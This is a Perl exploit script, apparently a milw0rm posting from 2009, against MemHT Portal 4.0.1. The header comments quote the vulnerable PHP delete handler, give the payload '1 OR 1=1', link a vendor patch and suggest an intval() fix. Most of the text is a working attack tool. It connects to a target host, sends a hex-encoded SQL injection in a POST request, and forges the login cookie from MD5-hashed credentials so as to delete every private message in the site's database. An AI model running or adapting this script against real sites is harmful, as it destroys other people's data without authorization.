<html><head><title>MemHT Portal <= 4.0.1 (pvtmsg) Delete All Private Messages Exploit</title></head><pre>#!/usr/bin/perl
# MemHT Portal &lt;= 4.0.1 (pvtmsg) Delete All Private Messages Exploit
# by yeat - staker[at]hotmail[dot]it

&lt;&lt;Details;
   
   Note:

   1- works regardless of php.ini settings. 
   2- blind sql injection benchmark() method is possible.
   3- don't add me on msn messenger.
   4- Thanks to evilsocket &amp;&amp; Sir Dark.
   5- MemHT is a good content management system but it has some security problem.
   6- http://milw0rm.com/exploits/7859 
      security patch: http://www.memht.com/forum_thread_17756_FixPatch-4-0-1.html
   
   /pages/pvtmsg/index.php / Line: 851 -867
 
   &lt;?php

      
      }

      break;
      
      case &quot;deleteSelected&quot;:

        if (isset($_POST['deletenewpm'])) {
        foreach ($_POST['deletenewpm'] as $value) {
          $dblink-&gt;query(&quot;DELETE FROM memht_pvtmsg WHERE id=$value&quot;);
          }
       }
       if (isset($_POST['deletepm'])) {
         foreach ($_POST['deletepm'] as $value) {
          $dblink-&gt;query(&quot;DELETE FROM memht_pvtmsg WHERE id=$value&quot;);
         }
       }

    ?&gt;
    
  
  ok then foreach ($_POST['deletenewpm'] as $value)
  
  deletenewpm[]= $value ;) so if we send a evil code like this:
  1 OR 1=1 we'll delete all messages from mysql database
  
  Possible Fix:
  
  Line: 859 &amp;&amp; 864

  Edit $dblink-&gt;query(&quot;DELETE FROM memht_pvtmsg WHERE id=$value&quot;); 
  Fix: $dblink-&gt;query(&quot;DELETE FROM memht_pvtmsg WHERE id=&quot;.intval($value));



  regards :)



Details


use IO::Socket;
use Digest::MD5('md5_hex');

our ($host,$path,$id,$username,$password) = @ARGV;


if (@ARGV != 5) {
   
   print &quot;\n+--------------------------------------------------------------------+\r&quot;,
         &quot;\n| MemHT Portal &lt;= 4.0.1 (pvtmsg) Delete All Private Messages Exploit |\r&quot;,
         &quot;\n+--------------------------------------------------------------------+\r&quot;,
         &quot;\nby yeat - staker[at]hotmail[dot]it\n&quot;,
         &quot;\nUsage     + perl $0 [host] [path] [id] [username] [password]\r&quot;,
         &quot;\nHost      + localhost\r&quot;,
         &quot;\nPath      + /MemHT\r&quot;,
         &quot;\nID        + your user id\r&quot;,
         &quot;\nPassword  + your password\n&quot;;
   exit;
}   

else {
   
   my $html = undef;
   my $sock = new IO::Socket::INET(
                                    PeerAddr =&gt; $host,
                                    PeerPort =&gt; 80,
                                    Proto    =&gt; 'tcp',
                                  ) or die $!;
                                      
   my $post = &quot;deletenewpm[]=\x31\x20\x4F\x52\x20\x31\x3D\x31&quot;.
              &quot;&amp;Submit.x=34&quot;.
              &quot;&amp;Submit.y=9&quot;;
   
   my $auth = cookies();
   
   my $data = &quot;POST /$path/index.php?page=pvtmsg&amp;op=deleteSelected HTTP/1.1\r\n&quot;.
              &quot;Host: $host\r\n&quot;.
              &quot;User-Agent: Lynx (textmode)\r\n&quot;.
              &quot;Cookie: $auth\r\n&quot;.
              &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
              &quot;Content-Length: &quot;.length($post).&quot;\r\n\r\n$post\r\n\r\n&quot;.
              &quot;Connection: close\r\n\r\n&quot;;
              
   $sock-&gt;send($data);    
   
   while (&lt;$sock&gt;) {
      $html .= $_;
   }           
   
   if ($html =~ /Private Messages/i) {
      print &quot;Exploit successfull,all messages deleted.\n&quot;;
   }
   else {
      print &quot;Exploit failed!\n&quot;;
   }      
}


sub cookies
{
    $username = md5_hex($username);   
    $password = md5_hex($password);
    
    return &quot;login_user=$id#$username#$password&quot;;
}

# milw0rm.com [2009-02-16]</pre></html>